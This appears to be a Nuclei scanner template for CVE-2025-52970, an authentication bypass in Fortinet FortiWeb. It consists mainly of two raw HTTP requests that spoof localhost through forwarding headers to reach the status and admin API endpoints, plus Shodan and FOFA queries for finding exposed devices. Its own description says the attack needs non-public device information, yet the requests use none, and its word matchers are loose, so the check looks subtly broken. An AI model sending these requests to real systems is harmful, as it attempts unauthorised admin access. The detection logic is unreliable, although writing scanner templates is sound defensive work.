id: CVE-2025-52970

info:
  name: Fortinet FortiWeb - Broken Access Control
  author: bryanwills
  severity: high
  description: |
    Fortinet FortiWeb <= 7.6.3, <= 7.4.7, <= 7.2.10, and <= 7.0.10 contain a broken access control caused by improper handling of parameters, letting unauthenticated remote attackers with non-public device info gain admin privileges via crafted requests.
  reference:
    - https://pwner.gg/blog/2025-08-13-fortiweb-cve-2025-52970
    - https://github.com/Hex00-0x4/FortiWeb-CVE-2025-52970-Authentication-Bypass
    - https://fortiguard.fortinet.com/psirt/FG-IR-25-448
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cve-id: CVE-2025-52970
    cwe-id: CWE-284
    epss-score: 0.73693
    epss-percentile: 0.98771
  metadata:
    verified: true
    max-request: 2
    vendor: fortinet
    product: fortiweb
    shodan-query: ssl:"cn=fortiweb"
    fofa-query: title="FortiWeb"
    google-query: intitle:"FortiWeb"
  tags: cve,cve2025,fortinet,fortiweb,broken-access-control,authentication-bypass,kev

http:
  - raw:
      - |
        GET /api/v2.0/system/status HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
        Accept: application/json
        X-Forwarded-For: 127.0.0.1
        X-Real-IP: 127.0.0.1
        X-Client-IP: 127.0.0.1
        X-Remote-IP: 127.0.0.1
        X-Originating-IP: 127.0.0.1
        X-Remote-Addr: 127.0.0.1
        Connection: close

    matchers:
      - type: word
        part: body
        words:
          - "FortiWeb"
          - "system"
        condition: and

      - type: status
        status:
          - 200

  - raw:
      - |
        GET /api/v2.0/system/admin HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
        Accept: application/json
        X-Forwarded-For: 127.0.0.1
        X-Real-IP: 127.0.0.1
        X-Client-IP: 127.0.0.1
        X-Remote-IP: 127.0.0.1
        X-Originating-IP: 127.0.0.1
        X-Remote-Addr: 127.0.0.1
        Connection: close

    matchers:
      - type: word
        part: body
        words:
          - "admin"
          - "privilege"
        condition: and

      - type: status
        status:
          - 200
